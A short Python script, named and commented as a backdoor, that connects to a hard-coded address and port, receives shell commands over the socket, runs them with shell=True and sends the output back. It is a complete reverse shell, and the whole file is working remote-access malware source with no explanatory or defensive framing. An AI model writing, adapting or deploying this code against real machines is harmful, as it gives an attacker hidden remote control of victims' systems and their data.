#!/usr/bin/env python

import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        # Send data transformed into type byte for socket.send
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # Initialize empty string to which segments will be added
        json_data = ""

        while True:
            try:
                # Convert received data from type byte to type string
                segment = self.connection.recv(1024).decode()
                # Concatenate each segment of data
                json_data += segment
                # Attempt to parse JSON. If it's not yet complete, ValueError is raised.
                return json.loads(json_data)
            except ValueError:
                # Continue receiving until entire JSON object arrives
                continue

    def execute_system_command(self, command):
        try:
            execution = subprocess.check_output(command, shell=True)
            return execution
        except:
            execution = 'That is not a valid Windows cl command, please enter a valid command'
            return execution.encode()


    def run(self):
        while True:
            command = self.reliable_receive()
            if command.lower() == 'exit':
                self.connection.close()
                exit()
            command_result = self.execute_system_command(command)

            # Convert command_result to string prior to sending data
            self.reliable_send(command_result.decode(errors="ignore"))
        self.connection.close()

# Start backdoor
my_backdoor = Backdoor("192.168.164.128", 4444)
my_backdoor.run()
